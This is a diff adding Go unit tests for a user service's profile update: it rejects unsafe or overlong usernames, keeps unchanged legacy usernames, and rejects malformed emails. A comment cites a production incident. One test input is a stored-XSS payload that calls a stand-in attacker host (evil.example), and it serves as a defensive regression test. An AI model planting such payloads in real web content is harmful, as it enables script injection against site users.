@@ -4,6 +4,7 @@ package service
 
 import (
 	"context"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -80,4 +81,45 @@ func TestUpdateStatus_OnlyDeclaresStatus(t *testing.T) {
 
 	require.NoError(t, svc.UpdateStatus(context.Background(), 7, StatusDisabled))
 	require.Equal(t, []UserUpdateFields{{Status: true}}, repo.updateFields)
+}
+
+// 生产事故复盘：外部用户通过 PUT /api/v1/user 写入 <svg onload=...> 用户名；
+// 这里锁死该向量：标记字符必须 400，且不能落库。
+func TestUpdateProfile_RejectsUnsafeUsername(t *testing.T) {
+	repo := &mockUserRepo{getByIDUser: &User{ID: 7, Balance: 0.30, Status: StatusActive}}
+	svc := NewUserService(repo, nil, nil, nil)
+
+	xss := `<svg/onload=fetch('//evil.example')>`
+	_, err := svc.UpdateProfile(context.Background(), 7, UpdateProfileRequest{Username: &xss})
+	require.ErrorIs(t, err, ErrUsernameInvalid)
+	require.Empty(t, repo.updateFields, "rejected username must not reach the repository")
+
+	tooLong := strings.Repeat("名", MaxUsernameRunes+1)
+	_, err = svc.UpdateProfile(context.Background(), 7, UpdateProfileRequest{Username: &tooLong})
+	require.ErrorIs(t, err, ErrUsernameInvalid)
+	require.Empty(t, repo.updateFields)
+}
+
+// 存量脏数据（历史用户名含被禁字符）回填自身时不拦截，避免历史用户无法保存其它字段。
+func TestUpdateProfile_AllowsUnchangedLegacyUsername(t *testing.T) {
+	legacy := "<legacy>"
+	repo := &mockUserRepo{getByIDUser: &User{ID: 7, Balance: 0.30, Status: StatusActive, Username: legacy}}
+	svc := NewUserService(repo, nil, nil, nil)
+
+	_, err := svc.UpdateProfile(context.Background(), 7, UpdateProfileRequest{Username: &legacy})
+	require.NoError(t, err)
+	require.Equal(t, []UserUpdateFields{{Username: true}}, repo.updateFields)
+}
+
+func TestUpdateProfile_RejectsMalformedEmailChange(t *testing.T) {
+	repo := &mockUserRepo{getByIDUser: &User{ID: 7, Balance: 0.30, Status: StatusActive, Email: "user@qq.com"}}
+	svc := NewUserService(repo, nil, nil, nil)
+
+	for _, email := range []string{"user name@example.com", "user@localhost", strings.Repeat("a", 65) + "@example.com"} {
+		t.Run(email, func(t *testing.T) {
+			_, err := svc.UpdateProfile(context.Background(), 7, UpdateProfileRequest{Email: &email})
+			require.ErrorIs(t, err, ErrEmailFormatInvalid)
+		})
+	}
+	require.Empty(t, repo.updateFields, "rejected email must not reach the repository")
 }
